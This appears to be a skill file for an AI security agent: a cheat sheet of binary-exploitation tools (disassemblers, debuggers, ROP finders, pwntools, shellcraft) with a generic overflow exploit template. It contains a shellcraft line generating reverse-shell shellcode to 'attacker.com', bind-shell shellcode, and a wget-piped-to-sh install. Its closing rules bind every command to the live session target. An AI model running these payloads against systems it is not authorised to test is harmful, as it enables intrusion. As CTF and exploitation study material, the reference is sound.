# TOOLS Skill: Binary Analysis Tools

## Purpose
Master binary exploitation tools.

## Disassemblers

### objdump
```bash
# Disassemble
objdump -d binary

# Intel syntax
objdump -M intel -d binary

# Full disassembly
objdump -d -M intel binary | less

# Show symbols
objdump -t binary

# Show headers
objdump -f binary
```

### radare2
```bash
# Open binary
r2 binary

# Analysis
[0x00001000]> aaa    # Analyze all
[0x00001000]> afl    # List functions
[0x00001000]> pdf    # Disassemble function
[0x00001000]> s sym.main  # Seek to main

# Debug mode
r2 -d binary

# Write mode
r2 -w binary
```

### IDA/Ghidra
```bash
# IDA command line
idal -c binary

# Ghidra
ghidraRun
# Import and analyze
```

## Debuggers

### gdb
```bash
# Start
gdb ./binary
gdb -q ./binary   # Quiet

# Commands
(gdb) run
(gdb) break *0x1234
(gdb) continue
(gdb) step
(gdb) next
(gdb) print $rax
(gdb) x/10x $rsp
(gdb) backtrace
```

### gdb-gef
```bash
# Install
wget -q -O- https://github.com/hugsy/gef/releases/download/20231011/gef.sh | sh

# Commands
gef➤  pdisass $pc
gef➤  heap chunks
gef➤  got
gef➤  vmmap
gef➤  checksec
```

### pwndbg
```bash
# Install
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# Commands
pwndbg> telescope $rsp
pwndbg> bins
pwndbg> rop
```

## ROP Tools

### ROPgadget
```bash
# Find gadgets
ROPgadget --binary binary
ROPgadget --binary binary --ropchain

# Search specific
ROPgadget --binary binary | grep "pop\|ret"
```

### ropper
```bash
# List gadgets
ropper --file binary

# Search
ropper --file binary --search "pop.*ret"
ropper --file binary --search "jmp"

# ROP chain
ropper --file binary --chain "execve"
```

### one_gadget
```bash
# Find one_gadgets
one_gadget libc.so.6

# Find with constraint
one_gadget libc.so.6 -f
```

## Binary Analysis

### checksec
```bash
# Check binary protections
checksec --file=binary

# Output:
# Arch:     amd64
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE
# Relro:    Partial
```

### pwntools
```python
from pwn import *

# Load binary
elf = ELF('./binary')
libc = ELF('./libc.so.6')

# Context
context.arch = 'amd64'
context.log_level = 'debug'

# Process/Remote
io = process('./binary')
io = remote('host', port)

# Send/Receive
io.send(b'payload')
io.sendline(b'input')
io.recvuntil(b'prompt: ')

# Interact
io.interactive()

# Build payload
payload = b'A' * offset
payload += p64(0xdeadbeef)
```

### patching
```python
# Edit binary
e = ELF('./binary')
e.asm(e.symbols['main'], 'ret')
e.save()

# Patch bytes
with open('binary', 'rb') as f:
    data = bytearray(f.read())
data[0x100] = 0x90
with open('patched', 'wb') as f:
    f.write(data)
```

## Heap Analysis

### pwntools heap
```python
from pwn import *

# Heap functions
r = process('./heap_challenge')
gdb.attach(r, '''
    break malloc
    break free
''')

# Use in script
r.sendlineafter(b'>', b'1')  # Allocate
r.sendlineafter(b'>', b'2')  # Free
```

### heapinfo (pwndbg)
```
pwndbg> heap
pwndbg> heap chunks
pwndbg> heap bins
pwndbg> find_fake_fast
```

## Format String Exploitation

### fstring (pwntools)
```python
from pwn import *

# Find offset
io = process('./binary')
io.sendline(b'%p ' * 20)
io.interactive()

# Build payload
payload = fmtstr_payload(offset, {write_addr: value})
```

## Memory Analysis

### Read memory
```python
# Read string
data = io.recvuntil(b'\n')

# Read after leak
io.sendline(b'%x')
leaked = io.recvline()
```

## Shellcode

### shellcraft
```python
from pwn import *

# Generate shellcode
shellcode = asm(shellcraft.amd64.linux.sh())

# Specific shellcodes
shellcraft.amd64.linux.cat('/flag')
shellcraft.amd64.linux.bind_shell(4444)
shellcraft.amd64.linux.connect('attacker.com', 4444)
```

## Automation

### exploit template
```python
#!/usr/bin/env python3
from pwn import *

HOST = '{target}'
PORT = 1337

def exploit():
    io = remote(HOST, PORT) if '--remote' in sys.argv else process('./binary')
    
    # Exploit
    payload = b'A' * 64
    payload += p64(0xdeadbeef)
    
    io.sendline(payload)
    io.interactive()

if __name__ == '__main__':
    exploit()
```

## CTF Tools

### pwn-container
```bash
# Use docker for consistent environment
docker run -it --rm -v $(pwd):/workspace ctf-tools
```

## Common Workflows

### Basic buffer overflow
```bash
# 1. Check protections
checksec --file=binary

# 2. Find offset
python3 -c "from pwn import *; print(cyclic(200))"
# Use pattern_offset to find offset

# 3. Find addresses
objdump -d binary | grep function
objdump -d binary | grep system

# 4. Build exploit
python3 exploit.py
```

## Tips
```
- Use pwntools for quick prototyping
- Use gef/pwndbg for debugging
- Always check protections first
- Save working exploits
```

## TOOL EXECUTION & ANTI-HALLUCINATION RULES
- **No Simulation**: You are strictly forbidden from simulating execution, mocking outputs, or pretending tool execution occurred. Only actual console output returned from a `TOOL:` block execution may be interpreted.
- **Target Binding**: All command arguments, parameters, and targets must be dynamically bound to the active session target `{target}`. Never replace the user target with a dummy placeholder (e.g. `example.com`).
- **No Evidence, No Finding**: If the tool command does not return output confirming a port, service, or vulnerability, do not report it as discovered.
